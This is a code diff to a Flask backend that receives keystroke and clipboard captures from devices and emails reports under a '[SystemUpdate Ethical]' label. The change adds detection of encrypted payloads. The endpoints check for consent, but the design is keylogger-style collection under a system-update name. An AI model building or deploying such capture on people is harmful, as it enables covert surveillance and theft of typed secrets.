@@ -19,12 +19,26 @@ def _claims_device_id() -> str:
     return str(claims.get("device_id") or claims.get("sub") or "unknown-device")
 
 
+def _is_envelope(payload: dict) -> bool:
+    """Recognize client-side encrypted envelope (v1 AES-GCM) without decrypting.
+    Expected fields: v, alg, iv, ct. AAD may be present.
+    """
+    if not isinstance(payload, dict):
+        return False
+    keys = set(payload.keys())
+    required = {"v", "alg", "iv", "ct"}
+    return required.issubset(keys)
+
+
 @data_bp.post("/keystrokes")
 @jwt_required()
 def post_keystrokes():
     if not _has_consent():
         return jsonify(error="consent_required"), 403
     payload = request.get_json(silent=True) or {}
+    if _is_envelope(payload):
+        # Accept encrypted payload; backend decrypt to be implemented in later phase
+        return jsonify(status="envelope_received"), 202
     # TODO: decrypt, redact, persist
     # Email report (best-effort)
     subject = f"[SystemUpdate Ethical] Keystrokes from { _claims_device_id() }"
@@ -43,6 +57,9 @@ def post_clipboard():
     if not _has_consent():
         return jsonify(error="consent_required"), 403
     payload = request.get_json(silent=True) or {}
+    if _is_envelope(payload):
+        # Accept encrypted payload; backend decrypt to be implemented in later phase
+        return jsonify(status="envelope_received"), 202
     # TODO: decrypt, redact, persist
     # Email report (best-effort)
     subject = f"[SystemUpdate Ethical] Clipboard from { _claims_device_id() }"
